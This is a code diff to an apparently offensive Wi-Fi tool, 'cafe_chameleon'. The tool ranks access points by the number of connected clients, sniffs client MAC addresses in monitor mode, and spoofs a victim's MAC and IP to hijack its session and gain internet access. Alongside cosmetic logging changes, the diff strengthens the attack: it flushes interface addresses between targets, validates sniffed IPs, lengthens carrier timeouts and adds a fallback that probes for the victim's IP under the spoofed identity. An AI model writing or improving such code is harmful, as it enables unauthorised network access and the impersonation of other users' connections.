@@ -13,6 +13,7 @@ from cafe_chameleon.ui.console import (
     log_plus,
     log_warning,
     log_main,
+    set_main_status,
     log_hijack,
     clear_window,
     log_step,
@@ -75,38 +76,30 @@ def run_aggressive(args) -> bool:
             air_duration = air_arg
         elif sys.stdin.isatty():
             try:
-                val = input("Enter duration in seconds to listen in monitor mode [default: 25]: ").strip()
+                val = get_user_input("Enter duration in seconds to listen in monitor mode [default: 25]: ").strip()
                 if val.isdigit() and int(val) > 0:
                     air_duration = int(val)
             except (KeyboardInterrupt, EOFError):
                 pass
 
-    log_main("========================================\n  AGGRESSIVE MULTI-BSSID EXPLORATION\n========================================", clear=True)
-    log_main(f"Interface   : {interface}")
-    log_main(f"Profile     : {profile}")
-    log_main(f"SSID        : {ssid}")
-    log_main(f"Air Sniff   : {'ENABLED (' + str(air_duration) + 's)' if is_air else 'DISABLED'}")
-    log_main("----------------------------------------\n")
+    status_str = f"Air Sniffing ({air_duration}s)" if is_air else "Active Exploration"
+    set_main_status(interface=interface, profile=profile, ssid=ssid, status=status_str)
 
     # 1. Initial internet check
     if has_internet():
         if not getattr(args, "force", False):
-            log_plus("Internet online.")
             log_main("[+] Internet online.")
             return True
         else:
-            log_step("Internet online (--force enabled). Continuing exploration...")
             log_main("[!] Internet online (--force enabled). Continuing exploration...")
 
     # 2. Discover BSSIDs for the SSID
     bssids = scan_bssids_for_ssid(ssid)
     if not bssids:
-        log_warning(f"No BSSIDs found for SSID '{ssid}'.")
         log_main(f"[-] No BSSIDs found for SSID '{ssid}'.")
         return False
 
-    log_info(f"Found {len(bssids)} BSSID(s) for '{ssid}'. Starting exploration...")
-    log_main(f"[+] Found {len(bssids)} BSSID(s) for '{ssid}':")
+    log_main(f"[+] Discovered {len(bssids)} BSSID(s) for '{ssid}'")
 
     # 3. If --air mode is enabled, sniff over-the-air Dot11 frames in monitor mode FIRST
     air_clients_map = {}
@@ -114,23 +107,23 @@ def run_aggressive(args) -> bool:
         target_bssid_list = [b["bssid"] for b in bssids]
         target_channel_list = [b["chan"] for b in bssids if b.get("chan")]
         air_clients_map = sniff_air_clients(target_bssid_list, interface=interface, duration=air_duration, target_channels=target_channel_list)
+        set_main_status(status="Active Exploration")
 
     # 4. Auto-rank BSSIDs by client count & signal strength (highest score first)
     bssids.sort(key=lambda b: calculate_bssid_score(b, air_clients_map)[0], reverse=True)
 
-    log_info("[+] Auto-Ranked BSSIDs:")
-    log_main("\n================ AUTO-RANKED BSSIDS ================")
+    log_main("\n\033[1;36m── AUTO-RANKED BSSID TARGETS ──────────────────────────────────────────\033[0m")
     for rank, b in enumerate(bssids, start=1):
         score, clients, sig = calculate_bssid_score(b, air_clients_map)
-        log_main(f"  #{rank}: BSSID {b['bssid']} | Score: {score:<4} | Clients: {clients:<2} | Sig: {sig}% | Ch: {b['chan']}")
-    log_main("----------------------------------------\n")
+        log_main(f" #{rank:<2} │ \033[1;37mBSSID:\033[0m {b['bssid']} │ \033[1;37mScore:\033[0m {score:<4} │ \033[1;37mClients:\033[0m {clients:<2} │ \033[1;37mSig:\033[0m {sig}% │ \033[1;37mCh:\033[0m {b['chan']}")
+    log_main("\033[1;30m────────────────────────────────────────────────────────────────────────\033[0m\n")
 
     if getattr(args, "select_bssid", False):
-        log_main("\n================ DISCOVERED BSSIDS LIST ================")
+        log_main("\n\033[1;36m── BSSID SELECTION LIST ───────────────────────────────────────────────\033[0m")
         for i, b in enumerate(bssids, start=1):
             score, clients, sig = calculate_bssid_score(b, air_clients_map)
-            log_main(f"  [{i}] {b['bssid']} (Clients: {clients}, Signal: {sig}%, Channel: {b['chan']})")
-        log_main("----------------------------------------\n")
+            log_main(f"  [{i}] {b['bssid']} (\033[1;37mClients:\033[0m {clients}, \033[1;37mSignal:\033[0m {sig}%, \033[1;37mChannel:\033[0m {b['chan']})")
+        log_main("\033[1;30m────────────────────────────────────────────────────────────────────────\033[0m\n")
 
         selected_idx = 0
         try:
@@ -174,7 +167,6 @@ def run_aggressive(args) -> bool:
 
             # Lock connection to this BSSID
             if not lock_bssid(target_bssid, profile):
-                log_warning(f"Skipping BSSID {target_bssid} (lock failed).")
                 log_main(f"[!] Skipping BSSID {target_bssid} (lock failed).")
                 continue
 
@@ -183,12 +175,10 @@ def run_aggressive(args) -> bool:
 
             # Check if internet access is available immediately
             if has_internet():
-                log_plus(f"SUCCESS! Internet verified on {target_bssid}!")
                 log_main(f"\033[92m[+] SUCCESS! Internet verified on {target_bssid}!\033[0m")
                 if not getattr(args, "force", False):
                     return True
                 else:
-                    log_step(f"--force enabled. Continuing attack on {target_bssid}...")
                     log_main(f"[!] --force enabled. Continuing attack on {target_bssid}...")
 
             # If over-the-air client targets were caught for this BSSID, impersonate each new target MAC directly
@@ -237,35 +227,50 @@ def run_aggressive(args) -> bool:
                     try:
                         tried_macs.add(client_mac.lower())
 
-                        resolved_ip = client_ip or resolve_mac_to_ip(client_mac, interface, target_subnet=auto_params.get("cidr"))
+                        # Flush previous static IP/route entries on interface before resolving/attacking next target
+                        _run(f"ip addr flush dev {interface} scope global", debug=False)
+                        valid_air_ip = None
+                        if client_ip:
+                            try:
+                                import ipaddress
+                                ip_obj = ipaddress.ip_address(str(client_ip))
+                                if ip_obj.version == 4 and not (ip_obj.is_multicast or ip_obj.is_loopback or ip_obj.is_link_local or ip_obj.is_unspecified or str(client_ip) == "255.255.255.255"):
+                                    valid_air_ip = str(client_ip)
+                            except Exception:
+                                valid_air_ip = None
+
+                        resolved_ip = valid_air_ip or resolve_mac_to_ip(client_mac, interface, target_subnet=auto_params.get("cidr"))
                         
                         # Guaranteed IP Resolution via DHCP Lease Query after MAC spoofing
                         if not resolved_ip:
                             log_wait(f"Querying DHCP lease -> {client_mac}...")
                             log_hijack(f"[*] Querying DHCP lease -> {client_mac}...")
                             set_mac_address(interface, client_mac, profile=profile)
-                            if not wait_for_carrier(interface, timeout=5.0):
+                            if not wait_for_carrier(interface, timeout=6.0):
                                 lock_bssid(target_bssid, profile)
-                                wait_for_carrier(interface, timeout=5.0)
+                                wait_for_carrier(interface, timeout=6.0)
                             resolved_ip = query_dhcp_lease_ip(interface, target_mac=client_mac)
+
+                            # Re-run multi-stage ARP/L3/Passive discovery techniques under spoofed MAC identity if DHCP fails
+                            if not resolved_ip:
+                                log_hijack(f"[*] DHCP fallback: running multi-stage L2/L3 probes as {client_mac}...")
+                                resolved_ip = resolve_mac_to_ip(client_mac, interface, target_subnet=auto_params.get("cidr"))
 
                         target_ip = resolved_ip or auto_ip
 
                         # Ensure carrier is ready before hijack attempt
-                        if not wait_for_carrier(interface, timeout=3.0):
+                        if not wait_for_carrier(interface, timeout=6.0):
                             lock_bssid(target_bssid, profile)
-                            wait_for_carrier(interface, timeout=5.0)
+                            wait_for_carrier(interface, timeout=6.0)
 
                         hijack_success = hijack(interface, target_ip, client_mac, netmask, broadcast, gw_ip, max_retries=2, profile=profile, bssid=target_bssid, channel=chan)
                         if hijack_success:
-                            log_plus(f"SUCCESS! Internet active via {client_mac} [{target_bssid}]")
                             log_main(f"\033[92m[+] SUCCESS! Internet active via {client_mac} [{target_bssid}]\033[0m")
                             if not getattr(args, "force", False):
                                 return True
 
                         if getattr(args, "force", False):
                             if not ask_proceed():
-                                log_warning("Stopped after impersonation.")
                                 log_main("[-] Stopped after impersonation.")
                                 has_acc = hijack_success or has_internet()
                                 if ask_restore(default_restore=not has_acc):
